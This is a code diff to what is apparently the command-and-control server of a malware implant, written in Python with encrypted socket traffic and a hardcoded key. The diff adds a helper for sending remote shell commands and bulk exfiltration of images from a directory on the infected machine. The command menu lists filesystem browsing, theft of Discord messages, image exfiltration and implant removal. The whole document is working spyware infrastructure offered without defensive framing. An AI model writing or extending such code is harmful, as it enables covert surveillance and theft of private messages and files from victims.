@@ -46,18 +46,35 @@ def decrypt_aes(recipeseed, encrypted_data):
     unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
     return unpadded_data
 
+def send_linux_command(cmd : bytes):
+    conn.sendall(encrypt_tdes(key, cmd))
+    
+    response = []
+    while True:
+        r = decrypt_tdes(key, conn.recv(4096)).decode()
+
+        if "Done" in r:
+            break
+
+        if len(response) == 0:
+            response = json.loads(r)
+        else:
+            response += json.loads(r)
+    
+    return response
+
 # Create a socket object
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((SERVER_IP, SERVER_PORT))
 key = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x17'
 
-i = 0
+count = 0
 
 '''
 Commands:
 1. ls, cat: to browse filesystem
 2. exfil: to exfil discord messages
-3. exfil image path/to/image.jpg: to exfil images 
+3. exfil path/to/images: to exfil images 
 4. remove: to remove implant from filesystem
 '''
 while True:
@@ -76,26 +93,32 @@ while True:
             server_socket.close()
             exit(0)
 
-        conn.sendall(encrypt_tdes(key, message.encode()))
-
         if message.split(' ')[0] == "exfil":
-            if len(message.split(' ')) > 1 and message.split(' ')[1] == "image":
-                response = []
+            if len(message.split(' ')) > 1:
+                path = message.split(' ')[1]
+                images = send_linux_command(f"ls {path}".encode())
 
-                img_size = decrypt_aes(key, conn.recv(1024)).decode()
-                rec_msg = conn.recv(int(img_size), socket.MSG_WAITALL)
+                for i in images:
+                    conn.sendall(encrypt_tdes(key, f"exfil {path}/{i}".encode()))
 
-                response = decrypt_aes(key, rec_msg)
-                print("Image data received successfully!")
+                    response = []
 
-                f = open(f"images/received_image_{i}.jpg", "x+")
-                f.close()
-                with open(f"images/received_image_{i}.jpg", "wb") as f:
-                    f.write(response)
+                    img_size = decrypt_aes(key, conn.recv(1024)).decode()
+                    rec_msg = conn.recv(int(img_size), socket.MSG_WAITALL)
 
-                print("Image file written successfully!")
-                i += 1
+                    response = decrypt_aes(key, rec_msg)
+                    print("Image data received successfully!")
+
+                    f = open(f"images/received_image_{count}.jpg", "x+")
+                    f.close()
+                    with open(f"images/received_image_{count}.jpg", "wb") as f:
+                        f.write(response)
+
+                    print("Image file written successfully!")
+                    count += 1
             else:
+                conn.sendall(encrypt_tdes(key, message.encode()))
+
                 response = []
                 while True:
                     r = decrypt_aes(key, conn.recv(4096)).decode()
@@ -108,17 +131,7 @@ while True:
                     else:
                         response += json.loads(r)
         else:  
-            response = []
-            while True:
-                r = decrypt_tdes(key, conn.recv(4096)).decode()
-
-                if "Done" in r:
-                    break
-
-                if len(response) == 0:
-                    response = json.loads(r)
-                else:
-                    response += json.loads(r)
+            response = send_linux_command(message.encode())
 
         print(response)
 
